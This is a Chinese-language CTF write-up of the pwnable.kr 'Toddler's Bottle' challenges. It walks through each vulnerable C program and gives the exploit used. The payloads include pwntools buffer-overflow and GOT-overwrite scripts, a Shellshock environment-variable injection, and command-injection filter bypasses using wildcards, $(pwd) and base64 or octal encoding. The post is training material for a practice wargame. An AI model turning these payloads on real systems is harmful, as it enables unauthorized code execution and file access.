---
title: Pwnable题解
categories:
  - CTF
tags:
  - CTF
  - PWN
abbrlink: cc4a2ff
date: 2020-12-23 11:11:41
updated: 2020-12-23 11:11:41
---
#CTF #PWN
# Toddler's Bottle

  

## fd

  

### 题目描述

  

Mommy! what is a file descriptor in Linux?

  

-   try to play the wargame your self but if you are ABSOLUTE beginner, follow this tutorial link:  
    [https://youtu.be/971eZhMHQQw](https://youtu.be/971eZhMHQQw)

  

ssh [fd@pwnable.kr](mailto:fd@pwnable.kr) -p2222 (pw:guest)

  

### 题目解析

  

先了解下fd是什么东西

  

fd(file descriptor)，文件描述符

[内核](https://baike.baidu.com/item/%E5%86%85%E6%A0%B8/108410)（kernel）利用文件描述符（file descriptor）来访问文件。文件描述符是非负整数。打开现存文件或新建文件时，内核会返回一个文件描述符。读写文件也需要使用文件描述符来指定待读写的文件。

习惯上，标准输入（standard input）的文件描述符是 0，标准输出（standard output）是 1，标准错误（standard error）是 2。

  

ssh连接上题目，查看题目代码

  

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
char buf[32];
int main(int argc, char* argv[], char* envp[]){
        if(argc<2){
                printf("pass argv[1] a number\n");
                return 0;
        }
        int fd = atoi( argv[1] ) - 0x1234;
        int len = 0;
        len = read(fd, buf, 32);
        if(!strcmp("LETMEWIN\n", buf)){
                printf("good job :)\n");
                system("/bin/cat flag");
                exit(0);
        }
        printf("learn about Linux file IO\n");
        return 0;

}

  

令fd为0(stdin)，再输入LETMEWIN就可以得到flag。

  

**payload**

  

./fd 4660
input：LETMEWIN

  

## collision

  

### 题目描述

  

Daddy told me about cool MD5 hash collision today.

I wanna do something like that too!

  

ssh [col@pwnable.kr](mailto:col@pwnable.kr) -p2222 (pw:guest)

  

### 题目解析

  

#include <stdio.h>
#include <string.h>
unsigned long hashcode = 0x21DD09EC;
unsigned long check_password(const char* p){
        int* ip = (int*)p;
        int i;
        int res=0;
        for(i=0; i<5; i++){
                res += ip[i];
        }
        return res;
}

int main(int argc, char* argv[]){
        if(argc<2){
                printf("usage:%s [passcode]\n", argv[0]);
                return 0;
        }
        if(strlen(argv[1]) != 20){
                printf("passcode length should be 20 bytes\n");
                return 0;
        }

        if(hashcode == check_password( argv[1] )){
                system("/bin/cat flag");
                return 0;
        }
        else
                printf("wrong passcode.\n");
        return 0;
}

  

`check_password`将`char*`强制转换为`int*`，也就是将输入的数据分为4个字节一组，5组数据相加最后的结果要等于`0x21DD09EC`

  

`0x21DD09EC/5 = 0x6C5CEC9 * 4 + 0x6C5CEC8`

  

**payload**

  

./col `python -c 'print "\xC9\xCE\xC5\x06\xC9\xCE\xC5\x06\xC9\xCE\xC5\x06\xC9\xCE\xC5\x06\xC8\xCE\xC5\x06"'`

  

## bof

  

### 题目描述

  

#include <stdio.h>
#include <string.h>
#include <stdlib.h>
void func(int key){
	char overflowme[32];
	printf("overflow me:");
	gets(overflowme);	// smash me!
	if(key == 0xcafebabe){
		system("/bin/sh");
	}
	else{
		printf("Nah..\n");
	}
}
int main(int argc, char* argv[]){
	func(0xdeadbeef);
	return 0;
}

  

### 题目解析

  

很明显的栈溢出，将key的值覆盖为`0xCAFEBABE`就可以了

  

**payload**

  

from pwn import *
context.log_level='debug'

p=remote("pwnable.kr",9000)
#print p.recvline()
payload='a'*52
payload+=p64(0xCAFEBABE)
p.sendline(payload)

p.interactive()

  

## flag

  

### 题目描述

  

虽然在pwnable上面，但是是一道逆向题

  

Papa brought me a packed present! let's open it.

  

Download:[http://pwnable.kr/bin/flag](http://pwnable.kr/bin/flag)

  

This is reversing task. all you need is binary

  

### 题目解析

  

刚拿到就直接放进了ida中，结果只显示4个函数，并且有的还无法F5。后来看了wp才知道程序被upx压缩过了

  

`upx -d flag`解压缩，ida分析程序

  

int __cdecl main(int argc, const char **argv, const char **envp)
{
  char *dest; // ST08_8

  puts((__int64)"I will malloc() and strcpy the flag there. take it.");
  dest = (char *)malloc(100LL);
  strcpy(dest, flag);
  return 0;
}

  

非常简单的逻辑，把flag复制到dest中，查看flag处的数据即可

  

## passcode

  

### 题目描述

  

#include <stdio.h>
#include <stdlib.h>

void login(){
        int passcode1;
        int passcode2;

        printf("enter passcode1:");
        scanf("%d", passcode1);
        fflush(stdin);

        // ha! mommy told me that 32bit is vulnerable to bruteforcing :)
        printf("enter passcode2:");
        scanf("%d", passcode2);

        printf("checking...\n");
        if(passcode1==338150 && passcode2==13371337){
                printf("Login OK!\n");
                system("/bin/cat flag");
        }
        else{
                printf("Login Failed!\n");
                exit(0);
        }
}

void welcome(){
        char name[100];
        printf("enter you name:");
        scanf("%100s", name);
        printf("Welcome %s!\n", name);
}

int main(){
        printf("Toddler's Secure Login System 1.0 beta.\n");

        welcome();
        login();

        // something after login...
        printf("Now I can safely trust you that you have credential :)\n");
        return 0;
}

  

### 题目解析

  

login函数中的两个scanf的参数没有加&，但是scanf依然会把passcode1和passcode2当成指针来存储数据，也就是说此时输入的数据应该在passcode1和passcode2中的值所指向的地址里面。

  

如果将passcode1或passcode2里面的值覆盖为某个函数的地址，构造好栈的布局，参数为`system("/bin/cat flag")`的地址，那么scanf就会将`system("/bin/cat flag")`的地址覆盖到原本的函数地址上去，然后得到flag。

  

接下来就需要计算name到passcode的长度

  

gdb反汇编分析，只看关键部分

  

  welcome:
   0x0804862f <+38>:    lea    -0x70(%ebp),%edx	;name的地址
   0x08048632 <+41>:    mov    %edx,0x4(%esp)
   0x08048636 <+45>:    mov    %eax,(%esp)
   0x08048639 <+48>:    call   0x80484a0 <__isoc99_scanf@plt>

  

  login:
  passcode1:
   0x0804857c <+24>:    mov    -0x10(%ebp),%edx	;passcode1的地址
   0x0804857f <+27>:    mov    %edx,0x4(%esp)
   0x08048583 <+31>:    mov    %eax,(%esp)
   0x08048586 <+34>:    call   0x80484a0 <__isoc99_scanf@plt>
  passcode2:
   0x080485aa <+70>:    mov    -0xc(%ebp),%edx	;passcode2的地址
   0x080485ad <+73>:    mov    %edx,0x4(%esp)
   0x080485b1 <+77>:    mov    %eax,(%esp)
   0x080485b4 <+80>:    call   0x80484a0 <__isoc99_scanf@plt>
  system_getflag:
   0x080485e3 <+127>:   movl   $0x80487af,(%esp)
   0x080485ea <+134>:   call   0x8048460 <system@plt>

  

通过计算可知，name到passcode1的长度为96字节，name的长度为100，刚好可以溢出覆盖passcode1。

  

接着查看plt表，因为只够覆盖到passcode1，所以选择fflush函数

  

**payload**

  

python -c "print 'A' * 96 + '\x00\xa0\x04\x08' + '134514147\n'" | ./passcode

  

## random

  

### 题目描述

  

#include <stdio.h>

int main(){
	unsigned int random;
	random = rand();	// random value!

	unsigned int key=0;
	scanf("%d", &key);

	if( (key ^ random) == 0xdeadbeef ){
		printf("Good!\n");
		system("/bin/cat flag");
		return 0;
	}

	printf("Wrong, maybe you should try 2^32 cases.\n");
	return 0;
}

  

### 题目解析

  

观察代码，令`key^random`的值等于`0xdeadbeef`就可以得到flag。刚开始以为是栈溢出，但是`scanf("%d",&key)`只会读取4个字节，不够覆盖random。

  

调试了几次发现random每次的值都一样，那么只需要将`0xdeadbeef`与random异或就可以得到key的值，最后输入key的时候要先把key转为10进制，因为scanf的格式化字符串是%d。

  

关于为什么random每次的值都一样

rand[函数](https://baike.baidu.com/item/%E5%87%BD%E6%95%B0)不是真正的随机数生成器，而srand()会设置供rand()使用的随机数种子。如果你在第一次调用rand()之前没有调用srand()，那么系统会为你自动调用srand()。如果用户在此之前没有调用过srand(seed)，它会自动调用srand(1)一次。而使用同种子相同的数调用 rand()会导致相同的[随机](https://baike.baidu.com/item/%E9%9A%8F%E6%9C%BA)数序列被生成。

  

## input2

  

### 题目描述

  

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <arpa/inet.h>

int main(int argc, char* argv[], char* envp[]){
	printf("Welcome to pwnable.kr\n");
	printf("Let's see if you know how to give input to program\n");
	printf("Just give me correct inputs then you will get the flag :)\n");

	// argv
	if(argc != 100) return 0;
	if(strcmp(argv['A'],"\x00")) return 0;
	if(strcmp(argv['B'],"\x20\x0a\x0d")) return 0;
	printf("Stage 1 clear!\n");	

	// stdio
	char buf[4];
	read(0, buf, 4);
	if(memcmp(buf, "\x00\x0a\x00\xff", 4)) return 0;
	read(2, buf, 4);
        if(memcmp(buf, "\x00\x0a\x02\xff", 4)) return 0;
	printf("Stage 2 clear!\n");
	
	// env
	if(strcmp("\xca\xfe\xba\xbe", getenv("\xde\xad\xbe\xef"))) return 0;
	printf("Stage 3 clear!\n");

	// file
	FILE* fp = fopen("\x0a", "r");
	if(!fp) return 0;
	if( fread(buf, 4, 1, fp)!=1 ) return 0;
	if( memcmp(buf, "\x00\x00\x00\x00", 4) ) return 0;
	fclose(fp);
	printf("Stage 4 clear!\n");	

	// network
	int sd, cd;
	struct sockaddr_in saddr, caddr;
	sd = socket(AF_INET, SOCK_STREAM, 0);
	if(sd == -1){
		printf("socket error, tell admin\n");
		return 0;
	}
	saddr.sin_family = AF_INET;
	saddr.sin_addr.s_addr = INADDR_ANY;
	saddr.sin_port = htons( atoi(argv['C']) );
	if(bind(sd, (struct sockaddr*)&saddr, sizeof(saddr)) < 0){
		printf("bind error, use another port\n");
    		return 1;
	}
	listen(sd, 1);
	int c = sizeof(struct sockaddr_in);
	cd = accept(sd, (struct sockaddr *)&caddr, (socklen_t*)&c);
	if(cd < 0){
		printf("accept error, tell admin\n");
		return 0;
	}
	if( recv(cd, buf, 4, 0) != 4 ) return 0;
	if(memcmp(buf, "\xde\xad\xbe\xef", 4)) return 0;
	printf("Stage 5 clear!\n");

	// here's your flag
	system("/bin/cat flag");	
	return 0;
}

  

题目总共有五关，需要依次通过，pwntools完美解决。

  

### 题目解析

  

#### stage 1 argv

  

if(argc != 100) return 0;
if(strcmp(argv['A'],"\x00")) return 0;
if(strcmp(argv['B'],"\x20\x0a\x0d")) return 0;
printf("Stage 1 clear!\n");

  

第一关要求给出100个参数，并且第’A'（65）个和第'B'（66）个分别是`\x00`和`\x20\x0a\x0d`。

  

构造list，一般情况，argv[0]是`"./input"`，也就是程序名

  

argv = list('1' * 100)
argv[0] = "./input"
argv[ord('A')] = "\x00"
argv[ord('B')] = "\x20\x0a\x0d"

  

#### stage 2 stdio

  

char buf[4];
read(0, buf, 4);
if(memcmp(buf, "\x00\x0a\x00\xff", 4)) return 0;
read(2, buf, 4);
if(memcmp(buf, "\x00\x0a\x02\xff", 4)) return 0;
printf("Stage 2 clear!\n");

  

第一个`memcmp`从stdin中读取数据，与`\x00\x0a\x00\xff`进行对比，第二个`memcmp`从stderr中读取数据进行对比。

  

pwntools中的process有2个参数，stdin和stderr，传入文件对象即可。

  

with open("stdin.txt", "wb") as file:
    file.write("\x00\x0a\x00\xff")
    file.close()
with open("stderr.txt", "wb") as file:
    file.write("\x00\x0a\x02\xff")
    file.close()

  

#### stage 3 env

  

if(strcmp("\xca\xfe\xba\xbe", getenv("\xde\xad\xbe\xef"))) return 0;
printf("Stage 3 clear!\n");

  

依旧使用process中的env参数，env是字典形式。

  

env = {"\xde\xad\xbe\xef": "\xca\xfe\xba\xbe"}

  

#### stage 4 file

  

FILE* fp = fopen("\x0a", "r");
if(!fp) return 0;
if( fread(buf, 4, 1, fp)!=1 ) return 0;
if( memcmp(buf, "\x00\x00\x00\x00", 4) ) return 0;
fclose(fp);
printf("Stage 4 clear!\n");

  

这一关很简单，创建个名字为`\x0a`的文件，内容为`\x00\x00\x00\x00`

  

with open("\x0a", "wb") as file:
    file.write("\x00\x00\x00\x00")
    file.close()

  

#### stage 5 network

  

int sd, cd;
	struct sockaddr_in saddr, caddr;
	sd = socket(AF_INET, SOCK_STREAM, 0);
	if(sd == -1){
		printf("socket error, tell admin\n");
		return 0;
	}
	saddr.sin_family = AF_INET;
	saddr.sin_addr.s_addr = INADDR_ANY;
	saddr.sin_port = htons( atoi(argv['C']) );
	if(bind(sd, (struct sockaddr*)&saddr, sizeof(saddr)) < 0){
		printf("bind error, use another port\n");
    		return 1;
	}
	listen(sd, 1);
	int c = sizeof(struct sockaddr_in);
	cd = accept(sd, (struct sockaddr *)&caddr, (socklen_t*)&c);
	if(cd < 0){
		printf("accept error, tell admin\n");
		return 0;
	}
	if( recv(cd, buf, 4, 0) != 4 ) return 0;
	if(memcmp(buf, "\xde\xad\xbe\xef", 4)) return 0;
	printf("Stage 5 clear!\n");

  

这一关是建立一个socket来接受数据，与`\xde\xad\xbe\xef`进行比较。

  

其中需要注意这两句

  

saddr.sin_addr.s_addr = INADDR_ANY;
saddr.sin_port = htons( atoi(argv['C']) );

  

第一句指定绑定的地址，`INADDR_ANY`事实上表示不确定地址，或“所有地址”、“任意地址”，`127.0.0.1`当然也包含在内，第二句指定绑定端口，端口号就是argv['C']的内容，因为argv是我们自己设置的，所以只要设置一个不与其他程序冲突的端口号就行。

  

直接使用pwntools的remote

  

r = remote("127.0.0.1", 9999)
r.send("\xde\xad\xbe\xef")

  

**payload**

  

from pwn import *

# stage 1 process
argv = list('1' * 100)
argv[0] = "./input"
argv[ord('A')] = "\x00"
argv[ord('B')] = "\x20\x0a\x0d"

# stage 2 stdio
with open("stdin.txt", "wb") as file:
    file.write("\x00\x0a\x00\xff")
    file.close()
with open("stderr.txt", "wb") as file:
    file.write("\x00\x0a\x02\xff")
    file.close()

# stage 3 env
env = {"\xde\xad\xbe\xef": "\xca\xfe\xba\xbe"}

# stage 4 file
with open("\x0a", "wb") as file:
    file.write("\x00\x00\x00\x00")
    file.close()

# stage 5 network
argv[ord('C')] = "9999"

p = process(argv=argv, env=env, stdin=open("stdin.txt","rb"), stderr=open("stderr.txt","rb"))
r = remote("127.0.0.1", 9999)
r.send("\xde\xad\xbe\xef")
r.close()

print p.recv()
print p.recv()

  

## leg

  

### 题目描述

  

#include <stdio.h>
#include <fcntl.h>
int key1(){
	asm("mov r3, pc\n");
}
int key2(){
	asm(
	"push	{r6}\n"
	"add	r6, pc, $1\n"
	"bx	r6\n"
	".code   16\n"
	"mov	r3, pc\n"
	"add	r3, $0x4\n"
	"push	{r3}\n"
	"pop	{pc}\n"
	".code	32\n"
	"pop	{r6}\n"
	);
}
int key3(){
	asm("mov r3, lr\n");
}
int main(){
	int key=0;
	printf("Daddy has very strong arm!:");
	scanf("%d", &key);
	if( (key1()+key2()+key3()) == key ){
		printf("Congratz!\n");
		int fd = open("flag", O_RDONLY);
		char buf[100];
		int r = read(fd, buf, 100);
		write(0, buf, r);
	}
	else{
		printf("I have strong leg :P\n");
	}
	return 0;
}

  

### 题目解析

  

第27行中`if( (key1()+key2()+key3()) == key )`显示key的值为`key1()+key2()+key3()`的总和，相等即可得到flag。

  

源码中的看不懂，直接去看反汇编中的部分代码。

  

(gdb) disass key1
Dump of assembler code for function key1:
   0x00008cd4 <+0>:		push	{r11}		; (str r11, [sp, #-4]!)
   0x00008cd8 <+4>:		add	r11, sp, #0
   0x00008cdc <+8>:		mov	r3, pc
   0x00008ce0 <+12>:	mov	r0, r3
   0x00008ce4 <+16>:	sub	sp, r11, #0
   0x00008ce8 <+20>:	pop	{r11}		; (ldr r11, [sp], #4)
   0x00008cec <+24>:	bx	lr
End of assembler dump.

  

首先了解下[ARM函数调用约定](https://blog.csdn.net/andy7002/article/details/72852822)，其中，结果为一个32位的整数时,可以通过寄存器R0返回，根据汇编代码可以看出，r3寄存器中的值传给了r0，而pc的值又传给了r3。

  

再来了解下[pc寄存器](https://bbs.ichunqiu.com/thread-40493-1-1.html?from=bkyl)，具体就不解释了不懂，大概就是

  

ARM模式下，pc=当前指令地址+8；

Thumb模式下，pc=当前指令+4

  

而控制什么模式的就是一些带状态的指令，比如bx addr，bx就是带状态切换跳转指令，当addr的最后一位为1时，会将跳转地址处的代码解析为Thumb指令，最后一位为0的话，就解析成ARM指令。

  

所以key1=8cdc+8=8CE4‬

  

(gdb) disass key2
Dump of assembler code for function key2:
   0x00008cf0 <+0>:	push	{r11}		; (str r11, [sp, #-4]!)
   0x00008cf4 <+4>:	add	r11, sp, #0
   0x00008cf8 <+8>:	push	{r6}		; (str r6, [sp, #-4]!)
   0x00008cfc <+12>:	add	r6, pc, #1
   0x00008d00 <+16>:	bx	r6
   0x00008d04 <+20>:	mov	r3, pc
   0x00008d06 <+22>:	adds	r3, #4 
   0x00008d08 <+24>:	push	{r3}
   0x00008d0a <+26>:	pop	{pc}
   0x00008d0c <+28>:	pop	{r6}		; (ldr r6, [sp], #4)
   0x00008d10 <+32>:	mov	r0, r3
   0x00008d14 <+36>:	sub	sp, r11, #0
   0x00008d18 <+40>:	pop	{r11}		; (ldr r11, [sp], #4)
   0x00008d1c <+44>:	bx	lr
End of assembler dump.

  

可以看到pc的值传给了r3，r3再与4相加，最后给r0，这样的话key2的值就应该为8D10‬，但是由于前面执行bx r6时r6最后一位为1，所以执行后面代码时的模式是Thumb模式，所以`mov r3, pc`时pc的值为8D08。

  

key2=8d04+4+4=8D0C‬

  

(gdb) disass key3
Dump of assembler code for function key3:
   0x00008d20 <+0>:	push	{r11}		; (str r11, [sp, #-4]!)
   0x00008d24 <+4>:	add	r11, sp, #0
   0x00008d28 <+8>:	mov	r3, lr
   0x00008d2c <+12>:	mov	r0, r3
   0x00008d30 <+16>:	sub	sp, r11, #0
   0x00008d34 <+20>:	pop	{r11}		; (ldr r11, [sp], #4)
   0x00008d38 <+24>:	bx	lr
End of assembler dump.

  

lr->r3->r0，lr是寄存器R14: 连接寄存器,记作lr ; 它用于保存子程序的返回地址，返回地址就是调用函数下面那一句的地址

  

   0x00008d7c <+64>:	bl	0x8d20 <key3>
   0x00008d80 <+68>:	mov	r3, r0

  

key3=8d80

  

**key=key1+key2+key3=‭‭0x1A770‬=108400‬**

  

## mistake

  

### 题目描述

  

hint:operator priority

  

#include <stdio.h>
#include <fcntl.h>

#define PW_LEN 10
#define XORKEY 1

void xor(char* s, int len){
	int i;
	for(i=0; i<len; i++){
		s[i] ^= XORKEY;
	}
}

int main(int argc, char* argv[]){
	
	int fd;
	if(fd=open("/home/mistake/password",O_RDONLY,0400) < 0){
		printf("can't open password %d\n", fd);
		return 0;
	}

	printf("do not bruteforce...\n");
	sleep(time(0)%20);

	char pw_buf[PW_LEN+1];
	int len;
	if(!(len=read(fd,pw_buf,PW_LEN) > 0)){
		printf("read error\n");
		close(fd);
		return 0;		
	}

	char pw_buf2[PW_LEN+1];
	printf("input password:");
	scanf("%10s", pw_buf2);

	// xor your input
	xor(pw_buf2, 10);

	if(!strncmp(pw_buf, pw_buf2, PW_LEN)){
		printf("Password OK\n");
		system("/bin/cat flag\n");
	}
	else{
		printf("Wrong Password\n");
	}

	close(fd);
	return 0;
}

  

### 题目解析

  

题目提示操作符优先级

  

这题问题出在

  

if(fd=open("/home/mistake/password",O_RDONLY,0400) < 0){
		printf("can't open password %d\n", fd);
		return 0;
	}

  

$<$优先级要比$=$号高，所以会先判断`open("/home/mistake/password",O_RDONLY,0400) < 0`，`open`函数读取成功文件描述符，必定大于0，所以`open("/home/mistake/password",O_RDONLY,0400) < 0`整个式子的值就为false(0)，也就是fd=0。

  

那么下面的`read(fd,pw_buf,PW_LEN)`其实就是从标准输入里面读取数据。

  

当输入1234567890，与1进行异或运算后可以得到0325476981

  

## shellshock

  

### 题目描述

  

Mommy, there was a shocking news about bash.

I bet you already know, but lets just make it sure :)

ssh [shellshock@pwnable.kr](mailto:shellshock@pwnable.kr) -p2222 (pw:guest)

  

#include <stdio.h>
int main(){
	setresuid(getegid(), getegid(), getegid());
	setresgid(getegid(), getegid(), getegid());
	system("/home/shellshock/bash -c 'echo shock_me'");
	return 0;
}

  

### 题目解析

setresgid

分别设置真实的,有效的和保存过的组标识号

setresuid

分别设置真实的,有效的和保存过的用户标识号

  

再看一下权限

  

shellshock@prowl:~$ ls -l
total 960
-r-xr-xr-x 1 root shellshock     959120 Oct 12  2014 bash
-r--r----- 1 root shellshock_pwn     47 Oct 12  2014 flag
-r-xr-sr-x 1 root shellshock_pwn   8547 Oct 12  2014 shellshock
-r--r--r-- 1 root root              188 Oct 12  2014 shellshock.c

  

shellshock文件所属组权限中有一个s，而s的含义代表**SGID(Set Group ID, 4)**

  

-   **SGID(Set Group ID, 4):**

  

对于可执行文件，`SGID`与`SUID`类似，引发的进程的所有组是程序文件所属的组。对于目录，`SGID`属性会使目录中新建文件的所属组与该目录相同。`SGID`也可以用s表示，如:

$ ls -l /vardrwxrwsr-x  2 root staff    4096 Apr 10  2014 localdrwxrwxr-x 15 root syslog   4096 Apr  4 19:57 log

  

也就是说shellshock运行时会得到shellshock_pwn的权限。

  

权限得到了，但是程序中并没有可以得到flag的地方，所以就要利用到shellshock漏洞，漏洞产生原因是由于bash使用的环境变量是通过函数名称来调用的，以“(){”开头通过环境变量来定义的。而在处理这样的“函数环境变量”的时候，并没有以函数结尾“}”为结束，而是一直执行其后的shell命令，例如：

  

env x='() { :;}; echo vulnerable' bash -c "echo this is a test"

  

存在漏洞的bash版本会输出

  

vulnerable
this is a test

  

在后面加`bash -c`的原因是打开一个bash使其立即触发漏洞，因为当前bash没有继承环境变量。

  

所以最终payload：

  

env x='() { :;}; bash -c cat flag' ./shellshock

  

#### 参考文章

  

[https://www.freebuf.com/articles/system/45390.html](https://www.freebuf.com/articles/system/45390.html)

  

[http://aikin.me/2015/04/03/linux-file-permission-ower/](http://aikin.me/2015/04/03/linux-file-permission-ower/)

  

[https://blog.csdn.net/starter](https://blog.csdn.net/starter)_/article/details/78164387

  

## coin1

  

### 题目描述

  

	---------------------------------------------------
	-              Shall we play a game?              -
	---------------------------------------------------
	
	You have given some gold coins in your hand
	however, there is one counterfeit coin among them
	counterfeit coin looks exactly same as real coin
	however, its weight is different from real one
	real coin weighs 10, counterfeit coin weighes 9
	help me to find the counterfeit coin with a scale
	if you find 100 counterfeit coins, you will get reward :)
	FYI, you have 60 seconds.
	
	- How to play - 
	1. you get a number of coins (N) and number of chances (C)
	2. then you specify a set of index numbers of coins to be weighed
	3. you get the weight information
	4. 2~3 repeats C time, then you give the answer
	
	- Example -
	[Server] N=4 C=2 	# find counterfeit among 4 coins with 2 trial
	[Client] 0 1 		# weigh first and second coin
	[Server] 20			# scale result:20
	[Client] 3			# weigh fourth coin
	[Server] 10			# scale result:10
	[Client] 2 			# counterfeit coin is third!
	[Server] Correct!

	- Ready? starting in 3 sec... -

  

简单来说就是给一组硬币，其中有一个假硬币，真硬币重量10，假的重量9，在有限的次数中猜出来假的硬币是哪一个，可以通过输入`0 1 2 3 4 .....`来了解`0 1 2 3 4 .....`这一组硬币重量的综合。

  

### 题目解析

  

利用二分查找可以很快得到答案

  

from pwn import *

r = remote("pwnable.kr", 9007)

for i in range(31):
    print r.recvline()

for i in range(100):
    n_c = r.recvline()
    # print n_c
    N = int(n_c.split(" ")[0][2:])
    C = int(n_c.split(" ")[1][2:])
    print "[*]N=%d,C=%d" % (N, C)
    left, right = 0, N
    mid = int((left+right) / 2)
    for i in range(C):
        payload = ' '.join([str(i) for i in range(left, mid)])
        r.sendline(payload)
        weight = int(r.recvline())
        if weight % 10 == 0:
            left = mid
            right = right
            mid = int((right + left) / 2.0)
        else:
            left = left
            right = mid
            mid = int((left + right) / 2.0)
    r.sendline(str(left))
    print r.recvline()

  

但是在本地执行脚本时由于网速问题，导致无法在60s内跑到第100次，所以要把脚本放到服务器上去执行。

  

连上之前任意一道题目的ssh，在tmp目录下写好脚本，`r = remote("pwnable.kr", 9007)`改为`r = remote("0.0.0.0",9007)`即可。

  

## blackjack

  

### 题目描述

  

Hey! check out this C implementation of blackjack game!
I found it online

http://cboard.cprogramming.com/c-programming/114023-simple-blackjack-program.html

I like to give my flags to millionares.
how much money you got?

Running at:nc pwnable.kr 9009

  

blackjack，又名21点，详见游戏规则

大概就是赌谁的点大的游戏

  

### 题目解析

  

原本以为是个正经的pwn题，但是看到后面发现是道源码审计题。

  

主要问题出在`betting`函数中

  

int betting() //Asks user amount to bet
{
 printf("\n\nEnter Bet: $");
 scanf("%d", &bet);

 if (bet > cash) //If player tries to bet more money than player has
 {
        printf("\nYou cannot bet more money than you have.");
        printf("\nEnter Bet: ");
        scanf("%d", &bet);
        return bet;
 }
 else return bet;
} // End Function

  

在判断`bet > cash`之后，又进行了一次scanf，并且没有进行判断，直接返回。所以第一次输入一个大于500的值，第二次再输入一个大于1000000的数就可以得到flag。

  

## lotto

  

### 题目描述

  

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>

unsigned char submit[6];

void play(){
	
	int i;
	printf("Submit your 6 lotto bytes:");
	fflush(stdout);

	int r;
	r = read(0, submit, 6);

	printf("Lotto Start!\n");
	//sleep(1);

	// generate lotto numbers
	int fd = open("/dev/urandom", O_RDONLY);
	if(fd==-1){
		printf("error. tell admin\n");
		exit(-1);
	}
	unsigned char lotto[6];
	if(read(fd, lotto, 6) != 6){
		printf("error2. tell admin\n");
		exit(-1);
	}
	for(i=0; i<6; i++){
		lotto[i] = (lotto[i] % 45) + 1;		// 1 ~ 45
	}
	close(fd);
	
	// calculate lotto score
	int match = 0, j = 0;
	for(i=0; i<6; i++){
		for(j=0; j<6; j++){
			if(lotto[i] == submit[j]){
				match++;
			}
		}
	}

	// win!
	if(match == 6){
		system("/bin/cat flag");
	}
	else{
		printf("bad luck...\n");
	}

}

void help(){
	printf("- nLotto Rule -\n");
	printf("nlotto is consisted with 6 random natural numbers less than 46\n");
	printf("your goal is to match lotto numbers as many as you can\n");
	printf("if you win lottery for *1st place*, you will get reward\n");
	printf("for more details, follow the link below\n");
	printf("http://www.nlotto.co.kr/counsel.do?method=playerGuide#buying_guide01\n\n");
	printf("mathematical chance to win this game is known to be 1/8145060.\n");
}

int main(int argc, char* argv[]){

	// menu
	unsigned int menu;

	while(1){

		printf("- Select Menu -\n");
		printf("1. Play Lotto\n");
		printf("2. Help\n");
		printf("3. Exit\n");

		scanf("%d", &menu);

		switch(menu){
			case 1:
				play();
				break;
			case 2:
				help();
				break;
			case 3:
				printf("bye\n");
				return 0;
			default:
				printf("invalid menu\n");
				break;
		}
	}
	return 0;
}

  

### 题目解析

  

程序从`/dev/urandom`中读取6个字节随机数，与用户输入的数据进行对比，而问题就出在对比的地方

  

	for(i=0; i<6; i++){
		for(j=0; j<6; j++){
			if(lotto[i] == submit[j]){
				match++;
			}
		}
	}

  

程序写成了嵌套循环，结果导致只要有一次lotto[i]==submit[j]，match++就可以加到6，最后得到flag。那么就随便挑个字符，然后爆破就行了。

  

from pwn import *

s=ssh("lotto","pwnable.kr",2222,"guest")
p=s.process("/home/lotto/lotto")
p.recv()
while True:
    p.sendline("1")
    p.recv()
    payload="------"
    p.sendline(payload)
    recv_str=p.recv()
    if "bad luck...\n" not in recv_str:
        print recv_str
        break

  

## cmd1

  

### 题目描述

  

#include <stdio.h>
#include <string.h>

int filter(char* cmd){
	int r=0;
	r += strstr(cmd, "flag")!=0;
	r += strstr(cmd, "sh")!=0;
	r += strstr(cmd, "tmp")!=0;
	return r;
}
int main(int argc, char* argv[], char** envp){
	putenv("PATH=/thankyouverymuch");
	if(filter(argv[1])) return 0;
	system( argv[1] );
	return 0;
}

  

### 题目解析

  

程序执行用户输入的命令，但是设置了一个不存在的path环境变量`/thankyouverymuch`，并且对输入进行了过滤，不能输入sh，flag，tmp。

  

环境变量部分只需要带上路径访问就可以，过滤部分则需要利用linux的通配符，或者可以将"flag"拆分开

  

payload：

  

`./cmd1 "/bin/cat fl*"`

  

或者

  

`./cmd1 “/bin/cat \”f\”\”l\”\”a\”\”g\””`

  

## cmd2

  

### 题目描述

  

#include <stdio.h>
#include <string.h>

int filter(char* cmd){
	int r=0;
	r += strstr(cmd, "=")!=0;
	r += strstr(cmd, "PATH")!=0;
	r += strstr(cmd, "export")!=0;
	r += strstr(cmd, "/")!=0;
	r += strstr(cmd, "`")!=0;
	r += strstr(cmd, "flag")!=0;
	return r;
}

extern char** environ;
void delete_env(){
	char** p;
	for(p=environ; *p; p++)	memset(*p, 0, strlen(*p));
}

int main(int argc, char* argv[], char** envp){
	delete_env();
	putenv("PATH=/no_command_execution_until_you_become_a_hacker");
	if(filter(argv[1])) return 0;
	printf("%s\n", argv[1]);
	system( argv[1] );
	return 0;
}

  

### 题目解析

  

比起上一道题目难了许多，最麻烦的就是过滤了/，不能再`/bin/cat fl*`，当然还是有办法绕过。

  

-   **pwd方式**  
    虽然因为程序设置了PATH导致无法执行很多命令，但是发现可以执行pwd，有两种方法

1.  进入到根目录`/`,此时pwd返回的结果就是`/`，利用`$(pwd)`就可以得到`/`接着构造payload：  
    `/home/cmd2/cmd2 '$(pwd)bin$(pwd)cat $(pwd)home$(pwd)cmd2$(pwd)fl*'`
2.  首先在tmp目录下创建目录`/tmp/test/c`，这样在此目录下执行pwd会得到`/tmp/test/c`，接着在`/tmp/test`目录下建立cat的软连接：`ln -s /bin/cat cat`，在`/tmp/test/c`下建立flag的软连接：`ln -s /home/cmd2/flag flag`，然后在`/tmp/test/c`目录下执行命令：`/home/cmd2/cmd2 "$(pwd)at f*"`

-   编码方式

1.  BASE64  
    首先将`/bin/cat /home/cmd2/flag`进行base64编码，得到`L2Jpbi9jYXQgL2hvbWUvY21kMi9mbGFnCg==`，但是因为有=，所以需要在原来的字符串中插入两个空格，就不会有=了。  
    `echo "\57"`可以输出`/`，利用管道符进行解码，最后就可以得到flag  
    `./cmd2 '$(echo "L2Jpbi9jYXQgL2hvbWUvY21kMi9mbGFnICAK" | $(echo "\57")usr$(echo "\57")bin$(echo "\57")base64 -d)'`
2.  8进制  
    算出`/bin/cat flag`8进制代码，得到`\057\0142\0151\0156\057\0143\0141\0164\040\0146\0154\0141\0147`，接着执行`./cmd2 '$(echo "\057\0142\0151\0156\057\0143\0141\0164\040\0146\0154\0141\0147")'`

